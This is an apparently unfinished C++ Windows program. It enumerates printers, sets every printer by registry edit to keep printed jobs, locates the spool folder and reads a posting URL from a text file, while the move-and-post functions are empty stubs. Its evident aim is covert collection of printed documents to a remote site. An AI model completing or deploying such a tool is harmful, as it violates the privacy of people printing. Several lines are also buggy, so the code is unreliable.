#include <windows.h>;
#include <winspool.h>;
#include <iostream>;
#include <atlstr.h>;
#include <string>;
#include <fstream>;
#include <direct.h>;

using namespace std;

PRINTER_INFO_2* list;
DWORD cnt = 0;
DWORD sz = 0;
DWORD Level = 2;
DWORD test;
LPDEVMODE pDevModeX;
int i;

string SpoolLocation;
string SiteLocation;

void GetAllPrinters();
void ChangeKAPD();
void GetDefaultSpoolFileDirectory();
void CreateFolder();
void PostToLink();
void GetPOSTLink();
void MoveFiles();

int main(){

	GetAllPrinters();
	ChangeKAPD();
	GetDefaultSpoolFileDirectory();
	CreateFolder();
	GetPOSTLink();

	cout << "Spool Location: " << SpoolLocation << "\n";
	cout << "Site location: " << SiteLocation;

	cin.get();

	return 0;
}

//Get all Printers
void GetAllPrinters(){
	EnumPrinters(PRINTER_ENUM_LOCAL, NULL, Level, NULL, 0, &sz, &cnt );

	//---This Fills the PRINTER_INFO_2 list---

	if ((list = (PRINTER_INFO_2*) malloc(sz)) == 0 )   //No Idea what this does yet. Snipped online.
		return;
	
	if(!EnumPrinters(PRINTER_ENUM_LOCAL, NULL, Level, (LPBYTE)list, sz, &sz, &cnt)){free( list );
		return;
	}

	//---Ends the filling of the list---

	//---Print a list of all the printers---
	printf("Number of Printers on the computer is %i\n",cnt); //%i converts to int.

	CString PrintersName;

	for(int i = 0; i < (int)cnt; i++){
		printf("Name of a printer :%s\n",list[i].pPrinterName);  //Prints the Printers name
	}
	//---End Printing of Printers.. Ha---
}

//Change all printers to "Keep All Printed Documents" to "True"  -  http://support.microsoft.com/kb/167345
void ChangeKAPD(){ //Registry hack to change all printers to KAPD

	string printerStartLocation = "SYSTEM\\CurrentControlSet\\Control\\Print\\Printers\\";
	string printerEndLocation = "\\DsSpooler";
	string fullLocation;
	HKEY hKey;

	for (int i = 0; i < sizeof(list) - 1; i++){
		fullLocation = printerStartLocation + list[i].pPrinterName + printerEndLocation;

		//Test: "SYSTEM\\CurrentControlSet\\Control\\Print\\Printers\\Foxit Reader PDF Printer\\DsSpooler"

		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,(fullLocation.c_str()),0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS){ //Attempts to open the Registry Key location.
			TCHAR value[256];
			DWORD dwKeyDataType;
			UCHAR byteRegArray[] = {0x01};

			RegSetValueEx(hKey, "printKeepPrintedJobs", 0, REG_BINARY, (BYTE *)byteRegArray, sizeof(byteRegArray)); //Sets the key to 1 (Currently not working)
		}
			RegCloseKey(hKey); //Closes the key.
	}
}

//Find the Windows DEFAUlT Spoolfile Directory  -- You're able to change each printers Spoolfile Directory seperatly. Not going to worry about that currently.
void GetDefaultSpoolFileDirectory(){
	CString location;
	HKEY hKey;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,("SYSTEM\\CurrentControlSet\\Control\\Print\\Printers"),0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS){ //Attempts to open the Registry Key location.
		TCHAR value[256];
		DWORD dwKeyDataType;
		DWORD dwDataBufSize = 256;
		if (RegQueryValueEx(hKey,("DefaultSpoolDirectory"), NULL, &dwKeyDataType,(LPBYTE) &value, &dwDataBufSize) == ERROR_SUCCESS){ //Trys to get data from DefaultSpoolDirectory
			location = CString(value);
		}
		RegCloseKey(hKey); //Closes the key.
	}
	SpoolLocation = location;
}

//Create Folder called 
void CreateFolder(){
	mkdir("CachedFiles"); //Should automatically ignore if the file is already there.
}

//Move all files from the spoolfile to the CachedFiles folder.
void MoveFiles(){

}

//Get address from external file
void GetPOSTLink(){
	string line;
	ifstream myfile ("SiteLocation.txt");
	if (myfile.is_open()){
		while(getline (myfile,line) ){
			SiteLocation = line;
		}
		myfile.close();
	}
	else cout << "SiteLocation.txt not found"; 
}

//POST to that said address
void PostToLink(){

}